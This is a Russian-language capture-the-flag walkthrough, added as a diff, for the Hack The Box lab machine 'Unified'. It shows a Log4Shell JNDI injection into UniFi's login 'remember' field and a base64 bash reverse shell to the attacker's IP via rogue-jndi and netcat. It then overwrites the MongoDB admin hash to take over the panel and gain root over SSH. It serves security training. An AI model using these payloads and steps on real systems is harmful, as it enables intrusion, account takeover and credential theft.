@@ -1,0 +1,504 @@
+*** UNIFIED WRITE IP - Единная запись
+УНИФИЦИРОВАННЫЙ
+	
+	### INTRODUTION
+	ВВЕДЕНИЕ 
+
+	- В этой статье исследуются последствия использования Log4J в очень известной 
+	системе мониторинга сетевых устройств под названием «UniFi». В этом блоке 
+	показано, как настроить и установить необходимые пакеты и инструменты для 
+	эксплуатации UniFi путем злоупотребления уязвимостью Log4J и манипулирования 
+	заголовком POST, называемым , давая вам обратная оболочка на автомате. Вы 
+	также измените пароль администратора, изменив хэш, сохраненный в экземпляре 
+	MongoDB, работающем в системе, что позволит получить доступ к панели 
+	администрирования и приведет к раскрытию пароля SSH администратора.
+
+	### ENUMERATION 
+	ПЕРЕЧИСЛЕНИЕ
+		
+		- Первым шагом является сканирование целевого IP-адреса с помощью Nmap, 
+		чтобы проверить, какие порты открыты. Мы сделаем это с помощью программы 
+		под названием Nmap.
+			
+			sudo nmap -sC -sV -v {target_ip}
+				
+				22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+				6789/tcp open  ibm-db2-admin?
+				8080/tcp open  http-proxy
+				8443/tcp open  ssl/nagios-nsca Nagios NSCA
+					http-title: UniFI Network
+
+		- Скан показывает порт 8080, открываем запуск http-proxy. Прокси сервер
+		перенаправляет запросы на порт 8443, на котором, похоже, работает
+		веб-сервер SSL. Мы принимаем к сведению, что HTTP-title страницы на
+		порту 8443 это "UniFi Network"
+			
+			http://{target_ip}:8080 # PROXY SERVER REDIRECT 
+				
+				...
+
+			https://10.129.34.109:8443/manage/account/login?redirect=%2Fmanage
+
+		- При доступе к странице с помощью браузера нам предоставляется UniFi
+		страница для входа на веб-портал и номер версии 6.4.54. Если мы
+		когда-нибудь столкнемся с номером версии, всегда полезно исследовать
+		его конкретную версию в Google. Быстрый поиск в Google по ключевым
+		словам Exploit UniFy 6.4.54 раскрывает статья
+			
+			https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi
+
+			В которой обсуждается углубленная эксплуатация CVE-2021-44228 UniFy 
+				
+				https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi
+
+			# Больше информации об уязвимости log4J 
+				
+				https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation
+
+		- Это уязвимость Log4j может быть использована путем внедрения команд
+		операционной системы (внедрение команд ОС), что представляет собой 
+		уязвимость веб-безопасности, которая позволяет злоумышленнику выполнять 
+		произвольные команды операционной системы на сервере, на котором 
+		запущено приложение, и, как правило, полностью скомпрометировать 
+		приложение и все его данные 
+
+		- Чтобы определить это мы можем использовать FoxyProxy 
+
+			https://addons.mozilla.org/ru/firefox/addon/foxyproxy-standard/
+			
+			ADD TO ADDONS 
+
+			### USING 
+				
+				+ADD 
+				Proxy Type						= HTTP
+				Proxy IP address or DNS name	= 127.0.0.1 
+				Port							= 8080 # Burp listener port
+				Username						= # оставить пустым
+				Password						= # оставить пустым 
+
+		после отправки POST запроса на /api/login endpoint, чтобы передать запрос 
+		в BurpSuite который перехватит его в качестве посредника. Затем запрос 
+		можно отредактировать для ввода команд. 
+		
+		- Предоставляется отличный модуль, основанный на перехвате веб-запросов 
+			
+			https://academy.hackthebox.com/module/details/110
+
+
+		- Перед работой с BURPSUITE возможно понадобиться добавить сертификат
+		BurpSuite in Firefox во избежание фильтрации файрволом мозиллы
+			
+			### ADD BURPSUITE CERTIFICATE TO FIREFOX
+			
+				- GO TO url after include localhost proxy 
+					
+					http://burpsuite 
+
+				- Download CA Certificate в правом верхнем углу 
+					
+					~/Downloads/cacert.der
+
+				- Получили файл сертификат, добавляем его в Firefox
+					
+					Settings -> Privacy & Secutity -> Certificates 
+
+					View Certificates -> Autorities 
+						
+						import # choose directory with file 
+							
+							cacert.der 
+
+		- Сначала попытаемся войти на страницу с учетными данными  test:test,
+		поскольку мы не пытаемся подтвердить или получить доступ. Запрос на 
+		вход будет перехвачен BurpSuite, и мы сможем его изменить 
+			
+			! Прежде чем отправлять учетные данные, которые впоследствии
+			перехватит BurpSuite, необходимо проверить настройки фильтров
+			BurpSuite 
+				
+				+Right Mouse Click on field name of filter
+					
+					Filter by status code
+					2xx [success]			
+					3xx [rediretction]
+					4xx [request error]		On # Включить отображение запросов
+												 возвращающих ошибки
+					5xx [server error]
+				----------------------
+			
+			Иерархия перехваченных дирректорий 
+			- https://{target_ip}8443
+			 > api
+			 > manage
+			 > v2 
+
+			Отправляем запрос через форму авторизации 
+			 	
+				Username:	test
+				Password:	test
+
+				# BURP успешно перехватил его
+				https://{target_ip}:8443/api/login  POST
+				
+
+		Прежде чем мы изменим запрос, давайте отправим этот HTTPS пакет на
+		Repeater модуль в BurpSuite нажав CTRL+R  
+			
+
+	### Expluatation
+	Эксплуатация
+		
+		- Раздел "Эксплуатации" ранее упомянутого в статье
+			
+			https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi
+
+		упоминает, что мы должны ввести нашу полезную нагрузку в Remember 
+		параметр. Поскольку данные POST отправляются как объекты JSON, а
+		полезная нагрузка содержит скобки, чтобы предотвратить его анализ
+		как другой объект JSON, мы заключаем его в скобки, чтобы вместо этого
+		он анализировался как строка
+				
+			"$(jndi:ldap://{IP-адрес Tun0}/whatever)
+
+			POST /api/login/ HTTP/1.1
+			HOST: {target_ip}8443
+
+			{
+				"username": "test" 
+				"password": "test"
+				"remember": "$(jndi:ldap://10.10.15.18/whatever)"
+				"strict":true
+			}
+			
+
+		- Мы вводим полезную нагрузку в remember поле, как показано выше, чтобы
+		мы могли определить точку впрыска, если она существует. Если запрос
+		заставляет сервер снова подключиться к нам, тогда можно будет убедиться
+		что приложение уязвимо   
+			
+			JNDI это аббревиатура от API-интерфейса именования каталогов Java.
+			Выполняя вызовы этого API, приложения находят ресурсы и другие 
+			программные объекты. Ресурс - это программеый объект, обеспечивающий
+			соединение с системами, такими как серверы баз данных и системы
+			обмена сообщениями 
+
+			LDAP это аббревиатура от Облегченный протокол доступа к каталогам
+			Который является открытым и независимым от поставщиков. Стандартный
+			отраслевой прикладной протокол для доступа и обслуживания
+			распределенных информационных служб каталогов через Интернет или 
+			сеть. 
+
+			Порт по умолчанию, на котором работает LDAP:
+				
+				389
+
+		- После того, как мы нажмем SEND на панели RESPONSE отобразиться ответ
+		на запрос. Вывод показывает нам сообщение об ошибке, в котором
+		говорится, что полезная нагрузка недействительна, но, несмотря на 
+		сообщение об ошибке, полезная нагрузка фактически выполняется.
+
+			Response:
+				
+				Pretty
+
+				{
+					"meta":
+					{
+						"rc":"error",
+						"msg":"api.err.InvalidPayload"
+					},
+					"data":[]
+				}
+
+		- Приступим к запуску tcpdump на порту 389, который будет отслеживать
+		сетевой трафик для LDAP соединений 
+			
+			tcpdump - это компьютерная программа для анализа пакетов сети 
+			передачи данных, работающая под интерфейсом командной строки. Это 
+			позволяет пользователю отображать TCP/IP и другие пакеты, передаваемые 
+			или принимаемые по сети, к которой подключен компьютер
+
+				
+		- После запуска tcpdump повторно нажимаем SEND в BurpSuite
+			
+			sudo tcpdump -i tun0 port 389
+				
+				tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+				listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+				14:58:43.893159 IP 10.129.151.165.46318 > Dark.ldap: Flags [S], seq 1406710833, win 64240, options [mss 1285,sackOK,TS val 1087724692 ecr 0,nop,wscale 7], length 0
+				14:58:43.893187 IP Dark.ldap > 10.129.151.165.46318: Flags [R.], seq 0, ack 1406710834, win 0, length 0
+
+		- Вывод tcpdump показывает, что соединение получено на нашей машине. Это 
+		доказывает, что приложение действительно уязвимо, поскольку оно пытается 
+		подключиться к нам через порт LDAP 389.
+
+		- Необходимо будет установить Open-JDK а также Maven в нашей системе
+		чтобы создать полезную нагрузку, которую мы можем отправить на сервер
+		и даст нам удаленное управление кода в уязвимой системе 
+			
+			sudo pacman -S jdk11-openjdk 
+			
+			java -version # Command used to check the java version installed 
+
+		- Open-JDK это комлект для разработки Java, который используется для 
+		создания приложений Java. Maven, с другой стороны, представляет собой
+		интегрированную среду разработки (IDE), которую можно использовать для 
+		создания структурированного проекта и компиляции наших проектов в
+		jar файлы
+
+		- Эти приложения также помогут нам запустить rogue-jndi java приложение
+		которое запускает локальный сервер LDAP и позволяет нам получать
+		соединения с уязвимого сервера и выполнять вредоносный код 
+
+		- После установки Open-JDK, пора приступить к установке Maven.
+			
+			sudo pacman -S maven 
+			
+			mvn -v # Command used to check the java version installed 
+
+		- Необходимо загрузить и собрать Rogue-JNDI Java application 
+
+			git clone https://github.com/veracode-research/rogue-jndi
+
+			cd rogue-jndi
+
+			mvn package			
+				
+				Building RogueJndi 1.1
+				BUILD SUCCESS
+
+		- Это создаст .jar файл в папке rogue-jndi/target/ под названием
+		RogueJndi-1.1.jar. Теперь мы можем построить нашу полезную нагрузку 
+		чтобы перейти  RogueJndi-1.1.jar java приложение 
+			
+		- Чтобы использовать сервер Rogue-JNDI, нам нужно будет создать и 
+		передать ему полезную нагрузку, которая будет отвечать за предоставление
+		нам оболочки в уязвимой системе. Мы будем кодировать полезную нагрузку
+		в Base64, чтобы предотвратить любые проблемы с кодировкой 
+			
+			echo 'bash -c bash -i >&/dev/tcp/{MY TUN0 IP}/4444 0>&1' | base64
+				
+				YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTgvNDQ0NCAwPiYxCg==
+
+		...(ПРИМЕЧАНИЕ) В этом пошаговом руководстве мы будем использовать порт
+		4444 для получения оболочки
+
+		- После создания полезной нагрузки запускаем приложение Rogue-JNDI,
+		передав полезную нагрузку через опцию --command и ip-адрес интерфейса
+		tun0 через опцию --hostname 
+			
+			java -jar target/RogueJndi-1.1.jar --command \
+			"bash -c {echo, BASE64 STRING HERE}|{base64, -d}|{bash, -i}" \
+			--hostname "{YOUR TUN0 IP ADDRESS}" 
+
+			RUNNING ROGUE:
+
+			...(Примечание) Не оставлять пробелы после запятых
+
+			java -jar target/RogueJndi-1.1.jar --command \
+			> "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTgvNDQ0NCAwPiYxCg==} \
+			> |{base64,-d}|{bash,-i}" --hostname "10.10.15.252"
+				|R|o|g|u|e|J|n|d|i|
+				Starting HTTP server on 0.0.0.0:8000
+				Starting LDAP server on 0.0.0.0:1389
+				Mapping ldap://10.10.15.252:1389/o=tomcat to artsploit.controllers.Tomcat
+				... more
+
+		- Теперь когда сервер локально прослушивает порт 389, давайте откроем
+		другой терминал и запустим прослушиватель Netcat для захвата обратной
+		оболочки 
+			
+			sudo nc -lvnp 4444 
+
+		- Возвращаяст к нашему перехваченному POST-запросу, давайте изменим
+		полезную нагрузку на 
+			
+			EXAMPLE:
+				
+				${jndi:ldap://{Ваш Tun0 IP}:1389/o=tomcat} 
+					+SEND
+		
+		- После отправки запроса устанавливается соединение с нашим
+		мошенническим сервером и отображается следующее сообщение 
+			
+			ROGUE:
+				
+				Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
+
+		- Как только мы получаем вывод с сервера Rogue, на нашем прослушивателе
+		Netcat появляется оболочка, и мы можем обновить оболочку терминала,
+		используя следующую команду 
+			
+			sudo nc -lvp 4444
+				
+				Connection from 10.129.13.117:32932
+				script /dev/null -c bash
+				Script started, file is /dev/null
+				unifi@unified:/usr/lib/unifi$ 
+				 
+		- Приведенная выше команда превратит нашу оболочку в интерактивную,
+		которая позволит нам более эффективно взаимодействовать с системой 
+			
+			unifi@unified:/usr/lib/unifi$ cd /home/michael
+			unifi@unified:/usr/lib/unifi$ cat user.txt 
+				
+				6ced1a6a89e666c0620cdb10262ba127
+
+
+	### PRIVILEGE ESCALATION
+	ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
+		
+		- В статье говорится, что мы можем получить доступ к панели
+		администратора Unify приложения и, возможно, извлечь секреты SSH, 
+		используемые между устройствами. Сначала давайте проверим, работает ли
+		MongoDB в целевой системе, что может позволит нам извлечь учетные данные
+		для входа в административную панель 
+			
+			ps aux | grep mongo | grep -v grep 
+				
+				unifi         68  0.4  4.1 1100672 85104 ?       Sl   21:25   0:25 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
+
+			
+		- Мы можем увидеть MongoDB работает в целевой системе на порту 27717
+
+			MongoDB это доступная в исходном коде кросс-платформенная 
+			документо-ориентированная программа базы данных. MongoDB
+			классифицируется как программа базы данных NoSQL и использует 
+			JSON-подобные документы с необязательными схемами.
+					
+		- Давайте взаимодействовать со службой MongoDB, используя mongo утилиту
+		командной строки и попытаться извлечь пароль администратора. Быстрый
+		поиск в Google по ключевым словам показывает, что имя базы данных 
+		по умолчанию для приложения UniFi 
+			
+
+			# ace 
+
+
+			mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+				
+				MongoDB shell version v3.6.3
+				connecting to: mongodb://127.0.0.1:27117/ace
+				MongoDB server version: 3.6.3
+				{
+					"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+					"name" : "administrator",
+					"email" : "administrator@unified.htb",
+					"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+				...more 
+				
+				# flags mean
+				
+				--port PORT # port to connect to (default PORT=27017) 
+				mongo [OPTIONS] [DB_ADDRESS] [FILE+]
+
+				--eval SCRIPT # evaluate JSON 
+
+		- Вывод показывает пользователя с именем administrator. Хэш их паролей
+		находится в переменной x_shadow, но в этом случае его нельзя взломать 
+		никакими утилитами для взлома паролей. Вместо этого мы можем изменить
+		x_shadow хеш пароля с нашим собственным созданным хешем, чтобы заменить
+		пароль администратора и авторизоваться в административной панели. 
+
+		- Для этого мы можем использовать mkpasswd утилиту командной строки 
+			
+			### INSTALL MKPASSWD
+				
+				git clone https://aur.archlinux.org/mkpasswd.git 
+				cd mkpasswd
+				makepkg -c -s
+				sudo pacman -S whois 
+				sudo pacman -U mkpasswd-5.5.10-1-x86_64.pkg.tar.zst
+
+			@ mkpasswd -m sha-512 Password1234
+			$6$93BMa0QhuvkJSM6Y$/tnLgwLQsbvnuyVK.o9fBJ8DQGebCyIpp10tFXlGgVUTWDXCbOlck9APAu5XVecSwCbWkU4oacBWGHdN3fRSx.
+
+		- The $6$ это идентификатор используемого алгоритма хеширования, в
+		данном случае SHA-512, поэтому нам придется сделать хэш того же типа
+			
+			SHA-512 или алгоритм безопасного хеширования 512 — это алгоритм 
+			хеширования, используемый для преобразования текста любой длины в 
+			строку фиксированного размера. Каждый вывод создает SHA-512 длиной 
+			512 бит (64 байта). Этот алгоритм обычно используется для хеширования 
+			адресов электронной почты, хеширования паролей..
+
+		- После того, как мы сгенерируем хэш SHA-512, вывод будет похож на 
+		приведенный выше, однако из-за соли хэш будет меняться каждый раз, когда 
+		он генерируется 
+			
+			В процесс хеширования добавляется соль, чтобы обеспечить их уникальность,
+			повысить их сложность без увеличения требований пользователя и 
+			смягчить атаки на пароли, такие как хеш-таблицы.
+			
+		- Приступим к замене существующего хеша на созданный нами.
+			
+			EXAMPLE:
+				
+			mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
+
+			mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$93BMa0QhuvkJSM6Y$/tnLgwLQsbvnuyVK.o9fBJ8DQGebCyIpp10tFXlGgVUTWDXCbOlck9APAu5XVecSwCbWkU4oacBWGHdN3fRSx."}})'
+
+				MongoDB shell version v3.6.3
+				connecting to: mongodb://127.0.0.1:27117/ace
+				MongoDB server version: 3.6.3
+				WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
+
+		- Мы можем убедиться, что пароль был обновлен в базе данных Mongo
+		выполнив ту же команду, что и выше. Хэш SHA-512, по-видимому, был
+		обновлен 
+
+			mongo --port 27117 ace -eval "db.admin.find().forEach(printjson);"
+
+							
+			{
+				"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+				"name" : "administrator",
+				"email" : "administrator@unified.htb",
+				"x_shadow" : "$6$93BMa0QhuvkJSM6Y$/tnLgwLQsbvnuyVK.o9fBJ8DQGebCyIpp10tFXlGgVUTWDXCbOlck9APAu5XVecSwCbWkU4oacBWGHdN3fRSx."
+
+		- Теперь посетим веб-сайт и войдем в систему как administrator. Очень
+		важно отметить что имя пользователя с учетом регистра 
+			
+			https://10.129.34.109:8443/manage/account/login?redirect=%2Fmanage
+
+			Username: administrator
+			Password: Password1234
+				
+			Redirect  https://10.129.13.117:8443/manage/site/default/dashboard
+				
+				Everything is Great
+
+		- UniFi предлагает настройку аутентификации SSH, которая представляет 
+		собой функцию, позволяющую администрировать другие точки доступа через 
+		SSH с консоли или терминала.
+			
+			Go to Settings -> Device Authentication  
+					
+				Enable SSH authentication 		ON
+
+				Username: root 
+				Password: NotACrackablePassword4U2022
+
+
+		- Пробуем атуентифицироваться по SSH
+			
+			ssh root@10.129.13.117
+			root@10.129.13.117's password: NotACrackablePassword4U2022
+				
+			root@unified:~# cat root.txt
+				e50bc93c75b634e4b272d2f771c33681
+				
+
+
+
+
+
+
+
+
+
+
+
+
+
